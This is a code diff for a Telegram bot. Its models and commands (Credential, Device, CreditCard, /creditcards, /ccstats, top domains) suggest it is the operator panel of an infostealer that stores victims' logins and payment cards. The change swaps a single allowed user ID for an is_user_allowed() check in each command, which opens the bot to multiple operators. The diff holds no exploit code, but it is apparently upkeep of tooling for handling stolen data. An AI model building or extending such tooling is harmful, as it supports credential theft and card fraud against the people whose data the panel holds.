@@ -6,7 +6,7 @@ from telegram.ext import ContextTypes
 from sqlalchemy import func
 from app.database import SessionLocal
 from app.models import Credential, Device, Upload, CreditCard
-from .config import logger, ALLOWED_USER_ID, UPLOAD_DIR
+from .config import logger, is_user_allowed, UPLOAD_DIR
 from .utils import get_back_button
 
 
@@ -14,7 +14,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start command with comprehensive statistics"""
     user_id = update.effective_user.id
     
-    if user_id != ALLOWED_USER_ID:
+    if not is_user_allowed(user_id):
         await update.message.reply_text("⛔ Unauthorized access denied.")
         logger.warning(f"Unauthorized access attempt from user {user_id}")
         return
@@ -92,7 +92,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /status command"""
     user_id = update.effective_user.id
     
-    if user_id != ALLOWED_USER_ID:
+    if not is_user_allowed(user_id):
         await update.message.reply_text("⛔ Unauthorized access denied.")
         return
     
@@ -113,7 +113,7 @@ async def top100_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /top100 and /topdomains command to show top 100 domains"""
     user_id = update.effective_user.id
     
-    if user_id != ALLOWED_USER_ID:
+    if not is_user_allowed(user_id):
         await update.message.reply_text("⛔ Unauthorized access denied.")
         return
     
@@ -170,7 +170,7 @@ async def creditcards_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     """Handle /creditcards command to show credit card information"""
     user_id = update.effective_user.id
     
-    if user_id != ALLOWED_USER_ID:
+    if not is_user_allowed(user_id):
         await update.message.reply_text("⛔ Unauthorized access denied.")
         return
     
@@ -256,7 +256,7 @@ async def ccstats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /ccstats command to show credit card statistics"""
     user_id = update.effective_user.id
     
-    if user_id != ALLOWED_USER_ID:
+    if not is_user_allowed(user_id):
         await update.message.reply_text("⛔ Unauthorized access denied.")
         return
     
